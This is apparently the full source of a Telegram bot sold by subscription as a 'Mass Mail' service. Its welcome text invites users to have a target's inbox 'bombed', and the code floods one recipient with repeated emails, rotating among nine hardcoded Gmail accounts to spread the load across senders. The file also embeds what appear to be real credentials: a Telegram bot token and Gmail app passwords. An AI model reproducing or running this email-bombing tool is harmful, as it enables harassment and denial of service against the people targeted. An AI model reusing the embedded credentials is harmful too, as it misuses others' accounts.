from telegram import ParseMode
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackQueryHandler, CallbackContext
import random

BOT_TOKEN = '6795292888:AAGPvq5pOqoGIHXUpLrRv2EKytK_0gAIli4'
authorized_users = [6663845789, 6551446148, 6698364560, 1110013191]

senders = [
    {"email": "imvoid1001@gmail.com", "password": "mjmkalzfveddvkmr"},
    {"email": "massacres1001@gmail.com", "password": "pfzb xomf egmt utqv"},
    {"email": "usaa45600@gmail.com", "password": "yflgmdilamgveeux"},
    {"email": "lolwhosucks@gmail.com", "password": "rssrsfmnpmzjtcxl"},
    {"email": "Yourmomsucksmine69@gmail.com", "password": "urpcznlkyazksbsr"},
    {"email": "unknowntikku@gmail.com", "password": "dffiufucyixcfzfq"},
    {"email": "unknownsultan123@gmail.com", "password": "wetqhcxcvbtmmavc"},
    {"email": "bhaisalmon6969@gmail.com", "password": "ducrkxtufoqemdbt"},
    {"email": "aryansingh420890@gmail.com", "password": "clulyimkhbkubokm"}
]

SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 465

MAX_EMAILS_PER_SESSION = 50
MAX_EMAILS_PER_DAY = 800

email_counters = {}

RECIPIENT, SUBJECT, BODY, NUMBER_OF_EMAILS, TIME_DELAY = range(5)

def send_email(recipient, sender_email, sender_password, subject, body):
    """Function to send an email using specified sender credentials."""
    try:
        # Set up the email message
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        with smtplib.SMTP_SSL(SMTP_SERVER, SMTP_PORT) as server:
            server.login(sender_email, sender_password)
            server.send_message(message)
        return True  # Return True if the email is sent successfully

    except Exception as e:
        print(f'Failed to send email from {sender_email} to {recipient}: {e}')
        return False  # Return False if the email fails to send


def start(update: Update, context: CallbackContext):
    """Start the conversation and send a welcome message with buttons and an image."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text(
            "𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗽𝗲𝗿𝗺𝗶𝘁𝘁𝗲𝗱 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗯𝗼𝘁\n",
            "≡ 𝖡𝗎𝗒 𝗆𝖾𝗆𝖻𝖾𝗋𝗌𝗁𝗂𝗉 𝗈𝖿 𝗍𝗁𝖾 𝖻𝗈𝗍 𝗍𝗈 𝖿𝗋𝖾𝖾𝗅𝗒 𝗆𝖺𝗌𝗌 𝗆𝖺𝗂𝗅 𝖺𝗇𝗒𝗐𝗁𝖾𝗋𝖾.\n",
            "⩉ 𝖳𝗈 𝗏𝗂𝖾𝗐 𝗉𝗅𝖺𝗇𝗌, 𝗁𝗂𝗍 /𝖻𝗎𝗒"
        )
        return ConversationHandler.END

    keyboard = [
        [InlineKeyboardButton("𝖡𝗈𝗍 𝖴𝗉𝖽𝖺𝗍𝖾𝗌", url="https://t.me/alcyonebots"),
         InlineKeyboardButton("𝖡𝗈𝗍 𝖲𝗎𝗉𝗉𝗈𝗋𝗍", url="https://t.me/alcyone_support")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    image_url = "https://i.ibb.co/ts32gH1/file-5659.jpg"
    caption = (
        "𝖶𝖾𝗅𝖼𝗈𝗆𝖾 𝗍𝗈 𝗠𝗮𝘀𝘀 𝗠𝗮𝗶𝗹 𝖻𝗈𝗍 𝖻𝗒 𝗔𝗹𝗰𝘆𝗼𝗻𝗲\n\n"
        "✥ 𝖳𝗁𝖾 𝗎𝗅𝗍𝗂𝗆𝖺𝗍𝖾 𝖻𝗎𝗅𝗄 𝖾𝗆𝖺𝗂𝗅 𝗍𝗈𝗈𝗅 𝖽𝖾𝗌𝗂𝗀𝗇𝖾𝖽 𝖿𝗈𝗋 𝗍𝗁𝗈𝗌𝖾 𝗐𝗁𝗈 𝗍𝗁𝗂𝗇𝗄 𝖻𝗂𝗀.\n"
        "≡ 𝖣𝗋𝗈𝗉 𝗒𝗈𝗎𝗋 𝗋𝖾𝖼𝗂𝗉𝗂𝖾𝗇𝗍'𝗌 𝖾𝗆𝖺𝗂𝗅 𝖨𝖣 𝖺𝗇𝖽 𝗐𝖺𝗍𝖼𝗁 𝗂𝗍 𝖻𝗈𝗆𝖻𝖾𝖽!\n"
        "⩉ 𝖳𝗈 𝗍𝖾𝗋𝗆𝗂𝗇𝖺𝗍𝖾 𝗍𝗁𝖾 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗌𝖾𝗇𝖽 /cancel 𝗍𝗈 𝗍𝖾𝗋𝗆𝗂𝗇𝖺𝗍𝖾 𝖺𝗇𝖽 𝗍𝗁𝖾𝗇 𝗌𝖾𝗇𝖽 /start 𝖿𝗈𝗋 𝗇𝖾𝗐 𝗌𝖾𝗌𝗌𝗂𝗈𝗇"
    )

    context.bot.send_photo(chat_id=update.effective_chat.id, photo=image_url, caption=caption, reply_markup=reply_markup)
    return RECIPIENT


def get_recipient(update: Update, context: CallbackContext):
    """Store the recipient email and ask for the subject."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text('❌ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ.')
        return ConversationHandler.END

    context.user_data['recipient'] = update.message.text
    update.message.reply_text('𝖭𝗈𝗐, 𝗁𝗂𝗍 𝗆𝖾 𝗐𝗂𝗍𝗁 𝗍𝗁𝖾 𝗌𝗎𝖻𝗃𝖾𝖼𝗍 𝗈𝖿 𝗍𝗁𝖾 𝖾𝗆𝖺𝗂𝗅.')
    return SUBJECT


def get_subject(update: Update, context: CallbackContext):
    """Store the subject and ask for the body."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text('❌ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ.')
        return ConversationHandler.END

    context.user_data['subject'] = update.message.text
    update.message.reply_text('𝖭𝗈𝗐, 𝖽𝗋𝗈𝗉 𝗍𝗁𝖾 𝖻𝗈𝖽𝗒 𝗈𝖿 𝗍𝗁𝖾 𝖾𝗆𝖺𝗂𝗅.')
    return BODY


def get_body(update: Update, context: CallbackContext):
    """Store the body and ask for the number of emails."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text('❌ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ.')
        return ConversationHandler.END

    context.user_data['body'] = update.message.text
    update.message.reply_text(f'𝖧𝗈𝗐 𝗆𝖺𝗇𝗒 𝖾𝗆𝖺𝗂𝗅𝗌 𝖺𝗋𝖾 𝗐𝖾 𝖿𝗂𝗋𝗂𝗇𝗀 𝗈𝖿𝖿 𝗍𝗈𝖽𝖺𝗒? (Max {MAX_EMAILS_PER_SESSION})')
    return NUMBER_OF_EMAILS


def get_number_of_emails(update: Update, context: CallbackContext):
    """Store the number of emails and ask for the time delay."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text('❌ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ.')
        return ConversationHandler.END

    try:
        number_of_emails = int(update.message.text)

        remaining = MAX_EMAILS_PER_DAY - email_counters.get(user_id, 0)
        if number_of_emails > remaining:
            update.message.reply_text(f'⚠️ 𝖣𝖺𝗂𝗅𝗒 𝗅𝗂𝗆𝗂𝗍 𝗋𝖾𝖺𝖼𝗁𝖾𝖽.')
            number_of_emails = remaining

        if number_of_emails > MAX_EMAILS_PER_SESSION:
            update.message.reply_text(f'𝖸𝗈𝗎 𝗁𝖺𝗏𝖾 𝗋𝖾𝗊𝗎𝖾𝗌𝗍𝖾𝖽 {number_of_emails} 𝖾𝗆𝖺𝗂𝗅𝗌. 𝖳𝗁𝖾 𝗆𝖺𝗑 𝖼𝖺𝗉 𝗉𝖾𝗋 𝗌𝖾𝗌𝗌𝗂𝗈𝗇 𝗂𝗌 {MAX_EMAILS_PER_SESSION}. 𝖲𝖾𝗍𝗍𝗂𝗇𝗀 𝗍𝗈 {MAX_EMAILS_PER_SESSION}.')
            number_of_emails = MAX_EMAILS_PER_SESSION

        context.user_data['number_of_emails'] = number_of_emails
        update.message.reply_text('𝖭𝗈𝗐, 𝗌𝖾𝗍 𝗍𝗁𝖾 𝗍𝗂𝗆𝖾 𝖽𝖾𝗅𝖺𝗒 (𝗂𝗇 𝗌𝖾𝖼𝗈𝗇𝖽𝗌) 𝖻𝖾𝗍𝗐𝖾𝖾𝗇 𝖾𝖺𝖼𝗁 𝖾𝗆𝖺𝗂𝗅.')
        return TIME_DELAY
    except ValueError:
        update.message.reply_text('𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝖣𝖾𝗅𝖺𝗒, 𝖳𝗋𝗒 𝖠𝗀𝖺𝗂𝗇')
        return NUMBER_OF_EMAILS


def get_time_delay(update: Update, context: CallbackContext):
    """Store the time delay and start sending the emails."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text("𝖸𝗈𝗎 𝖺𝗋𝖾 𝗇𝗈𝗍 𝗉𝖾𝗋𝗆𝗂𝗍𝗍𝖾𝖽 𝗍𝗈 𝗎𝗌𝖾 𝗍𝗁𝗂𝗌 𝖻𝗈𝗍!!\n𝖡𝗎𝗒 𝗆𝖾𝗆𝖻𝖾𝗋𝗌𝗁𝗂𝗉 𝗈𝖿 𝗍𝗁𝖾 𝖻𝗈𝗍 𝗍𝗈 𝖿𝗋𝖾𝖾𝗅𝗒 𝗆𝖺𝗌𝗌 𝗆𝖺𝗂𝗅 𝖺𝗇𝗒𝗐𝗁𝖾𝗋𝖾 𝗐𝗂𝗍𝗁 𝗉𝗋𝗂𝖼𝗂𝗇𝗀 𝗌𝗍𝖺𝗋𝗍𝗂𝗇𝗀 𝖿𝗋𝗈𝗆 250 𝖨𝖭𝖱 𝖿𝗈𝗋 1 𝗆𝗈𝗇𝗍𝗁\n\n𝖳𝗈 𝗀𝖺𝗂𝗇 𝖺𝖼𝖼𝖾𝗌𝗌, 𝗁𝗂𝗍 𝖺𝗍 @𝖢𝖾𝗇𝗓𝖾𝗈")
        return ConversationHandler.END

    try:
        context.user_data['time_delay'] = float(update.message.text)
        recipient = context.user_data['recipient']
        subject = context.user_data['subject']
        body = context.user_data['body']
        number_of_emails = context.user_data['number_of_emails']
        time_delay = context.user_data['time_delay']

        email_counters.setdefault(user_id, 0)

        count = 0
        for _ in range(number_of_emails):
            sender = random.choice(senders)
            if send_email(
                recipient=recipient,
                sender_email=sender['email'],
                sender_password=sender['password'],
                subject=subject,
                body=body
            ):
                count += 1
                email_counters[user_id] += 1

                if email_counters[user_id] >= MAX_EMAILS_PER_DAY:
                    update.message.reply_text("𝖡𝗈𝗍'𝗌 𝖣𝖺𝗂𝗅𝗒 𝖾𝗆𝖺𝗂𝗅 𝗅𝗂𝗆𝗂𝗍 𝗋𝖾𝖺𝖼𝗁𝖾𝖽. 𝖳𝗋𝗒 𝖺𝗀𝖺𝗂𝗇 𝗍𝗈𝗆𝗈𝗋𝗋𝗈𝗐")
                    break

                update.message.reply_text(f"✅ {count} 𝖾𝗆𝖺𝗂𝗅{'s' if count > 1 else ''} 𝗌𝖾𝗇𝗍. 𝖶𝖺𝗂𝗍𝗂𝗇𝗀 𝖿𝗈𝗋 {time_delay} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌.")

            time.sleep(time_delay)

        update.message.reply_text("🎯 𝖬𝗂𝗌𝗌𝗂𝗈𝗇 𝖠𝖼𝖼𝗈𝗆𝗉𝗅𝗂𝗌𝗁𝖾𝖽. 𝖠𝗅𝗅 𝖤𝗆𝖺𝗂𝗅𝗌 𝗁𝖺𝗏𝖾 𝖻𝖾𝖾𝗇 𝗌𝖾𝗇𝗍 𝗌𝗎𝖼𝖼𝖾𝗌𝗌𝖿𝗎𝗅𝗅𝗒. 𝖦𝗈𝗈𝖽 𝗐𝗈𝗋𝗄.")
        return ConversationHandler.END
    except ValueError:
        update.message.reply_text('𝖨𝗇𝗏𝖺𝗅𝗂𝖽 𝖣𝖾𝗅𝖺𝗒, 𝖳𝗋𝗒 𝖠𝗀𝖺𝗂𝗇.')
        return TIME_DELAY


def cancel(update: Update, context: CallbackContext):
    """Cancel the conversation."""
    user_id = update.message.from_user.id
    if user_id not in authorized_users:
        update.message.reply_text('❌ ᴜɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ ᴜsᴇʀ.')
        return ConversationHandler.END

    update.message.reply_text('❌ 𝖮𝗉𝖾𝗋𝖺𝗍𝗂𝗈𝗇 𝖠𝖻𝗈𝗋𝗍𝖾𝖽, 𝖴𝗇𝗍𝗂𝗅 𝗇𝖾𝗑𝗍 𝗍𝗂𝗆𝖾.')
    return ConversationHandler.END

# Buy command to show initial plans view
def buy(update: Update, context: CallbackContext):
    """Handle /buy command and show the initial plans view."""
    keyboard = [
        [InlineKeyboardButton("𝖵𝗂𝖾𝗐 𝖯𝗅𝖺𝗇𝗌", callback_data='view_plans')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        "𝖢𝗅𝗂𝖼𝗄 𝖻𝖾𝗅𝗈𝗐 𝗍𝗈 𝗏𝗂𝖾𝗐 𝗍𝗁𝖾 𝖺𝗏𝖺𝗂𝗅𝖺𝖻𝗅𝖾 𝗌𝗎𝖻𝗌𝖼𝗋𝗂𝗉𝗍𝗂𝗈𝗇 𝗉𝗅𝖺𝗇𝗌.",
        reply_markup=reply_markup
    )

    return RECIPIENT

# Handle "View Plans" button press
def handle_buy_plans(update: Update, context: CallbackContext):
    """Edit the message to show subscription options after clicking View Plans."""
    keyboard = [
        [InlineKeyboardButton("𝖲𝗂𝗅𝗏𝖾𝗋 𝖯𝗅𝖺𝗇", callback_data='silver')],
        [InlineKeyboardButton("𝖦𝗈𝗅𝖽 𝖯𝗅𝖺𝗇", callback_data='gold')],
        [InlineKeyboardButton("𝖣𝗂𝖺𝗆𝗈𝗇𝖽 𝖯𝗅𝖺𝗇", callback_data='diamond')],
        [InlineKeyboardButton("𝖢𝗅𝗈𝗌𝖾", callback_data='close')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.callback_query.edit_message_text(
        "𝖢𝗁𝗈𝗈𝗌𝖾 𝗒𝗈𝗎𝗋 𝗉𝗅𝖺𝗇 𝗒𝗈𝗎 𝗐𝗂𝗌𝗁 𝗍𝗈 𝗌𝗎𝖻𝗌𝖼𝗋𝗂𝖻𝖾",
        reply_markup=reply_markup
    )

    return RECIPIENT

# Handle plan details and show the back and close buttons
def handle_plan_details(update: Update, context: CallbackContext):
    """Edit message to show details for each plan."""
    plan = update.callback_query.data

    if plan == 'silver':
        message = "𝗦𝗶𝗹𝘃𝗲𝗿 𝗣𝗹𝗮𝗻\n\n 1 𝖶𝖾𝖾𝗄- 80𝖨𝖭𝖱 or 1$ \n\n≡ 𝖶𝗂𝗍𝗁 𝗍𝗁𝗂𝗌 𝗉𝗅𝖺𝗇 𝗒𝗈𝗎 𝖼𝖺𝗇 𝖿𝗋𝖾𝖾𝗅𝗒 𝖺𝖼𝖼𝖾𝗌𝗌 𝗈𝗎𝗋 𝖬𝖺𝗌𝗌 𝖬𝖺𝗂𝗅 𝖻𝗈𝗍 𝖿𝗈𝗋 1 𝗐𝖾𝖾𝗄.\n⩉ [𝖢𝗅𝗂𝖼𝗄 𝗁𝖾𝗋𝖾 𝗍𝗈 𝗀𝖾𝗍 𝖰𝖱](https://i.ibb.co/w0VpVpk/file-5661.jpg)\n⌕ 𝖥𝗈𝗋 𝗈𝗍𝗁𝖾𝗋 𝗉𝖺𝗒𝗆𝖾𝗇𝗍 𝗆𝖾𝗍𝗁𝗈𝖽𝗌, 𝖼𝗈𝗇𝗍𝖺𝖼𝗍 @cenzeo"
    elif plan == 'gold':
        message = "𝗚𝗼𝗹𝗱 𝗣𝗹𝗮𝗻\n\n 15 𝖣𝖺𝗒𝗌- 150𝖨𝖭𝖱 or 2$ \n\n≡ 𝖶𝗂𝗍𝗁 𝗍𝗁𝗂𝗌 𝗉𝗅𝖺𝗇 𝗒𝗈𝗎 𝖼𝖺𝗇 𝖿𝗋𝖾𝖾𝗅𝗒 𝖺𝖼𝖼𝖾𝗌𝗌 𝗈𝗎𝗋 𝖬𝖺𝗌𝗌 𝖬𝖺𝗂𝗅 𝖻𝗈𝗍 𝖿𝗈𝗋 15 𝖣𝖺𝗒𝗌.\n⩉ [𝖢𝗅𝗂𝖼𝗄 𝗁𝖾𝗋𝖾 𝗍𝗈 𝗀𝖾𝗍 𝖰𝖱](https://i.ibb.co/w0VpVpk/file-5661.jpg)\n⌕ 𝖥𝗈𝗋 𝗈𝗍𝗁𝖾𝗋 𝗉𝖺𝗒𝗆𝖾𝗇𝗍 𝗆𝖾𝗍𝗁𝗈𝖽𝗌, 𝖼𝗈𝗇𝗍𝖺𝖼𝗍 @cenzeo"
    elif plan == 'diamond':
        message = "𝗗𝗶𝗮𝗺𝗼𝗻𝗱 𝗣𝗹𝗮𝗻\n\n 30 𝖣𝖺𝗒𝗌- 250𝖨𝖭𝖱 or 4$ \n\n≡ 𝖶𝗂𝗍𝗁 𝗍𝗁𝗂𝗌 𝗉𝗅𝖺𝗇 𝗒𝗈𝗎 𝖼𝖺𝗇 𝖿𝗋𝖾𝖾𝗅𝗒 𝖺𝖼𝖼𝖾𝗌𝗌 𝗈𝗎𝗋 𝖬𝖺𝗌𝗌 𝖬𝖺𝗂𝗅 𝖻𝗈𝗍 𝖿𝗈𝗋 15 𝖣𝖺𝗒𝗌.\n⩉ [𝖢𝗅𝗂𝖼𝗄 𝗁𝖾𝗋𝖾 𝗍𝗈 𝗀𝖾𝗍 𝖰𝖱](https://i.ibb.co/w0VpVpk/file-5661.jpg)\n⌕ 𝖥𝗈𝗋 𝗈𝗍𝗁𝖾𝗋 𝗉𝖺𝗒𝗆𝖾𝗇𝗍 𝗆𝖾𝗍𝗁𝗈𝖽𝗌, 𝖼𝗈𝗇𝗍𝖺𝖼𝗍 @cenzeo"

    keyboard = [
        [InlineKeyboardButton("𝖡𝖺𝖼𝗄", callback_data='view_plans')],
        [InlineKeyboardButton("𝖢𝗅𝗈𝗌𝖾", callback_data='close')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.callback_query.edit_message_text(
        message,
        reply_markup=reply_markup,
    )

    return RECIPIENT

# Close the message
def close(update: Update, context: CallbackContext):
    """Close the current message."""
    update.callback_query.delete_message()

    return ConversationHandler.END

# Cancel the conversation
def cancel(update: Update, context: CallbackContext):
    """Cancel the conversation."""
    update.message.reply_text("𝖮𝗉𝖾𝗋𝖺𝗍𝗂𝗈𝗇 𝖢𝖺𝗇𝖼𝖾𝗅𝗅𝖾𝖽.")
    return ConversationHandler.END

# Main function to handle the bot's lifecycle
def main():
    """Start the bot and handle commands."""
    updater = Updater("6795292888:AAGPvq5pOqoGIHXUpLrRv2EKytK_0gAIli4", use_context=True)
    dispatcher = updater.dispatcher

    # Add command handlers for /start and /buy
    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('buy', buy))

    # Create conversation handler for subscription-related actions
    conversation_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            RECIPIENT: [MessageHandler(Filters.text & ~Filters.command, get_recipient)],
            SUBJECT: [MessageHandler(Filters.text & ~Filters.command, get_subject)],
            BODY: [MessageHandler(Filters.text & ~Filters.command, get_body)],
            NUMBER_OF_EMAILS: [MessageHandler(Filters.text & ~Filters.command, get_number_of_emails)],
            TIME_DELAY: [MessageHandler(Filters.text & ~Filters.command, get_time_delay)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )

    dispatcher.add_handler(conversation_handler)

    # Handle callback queries for inline buttons
    dispatcher.add_handler(CallbackQueryHandler(handle_buy_plans, pattern='view_plans'))
    dispatcher.add_handler(CallbackQueryHandler(handle_plan_details, pattern='silver|gold|diamond'))
    dispatcher.add_handler(CallbackQueryHandler(close, pattern='close'))

    # Start polling
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
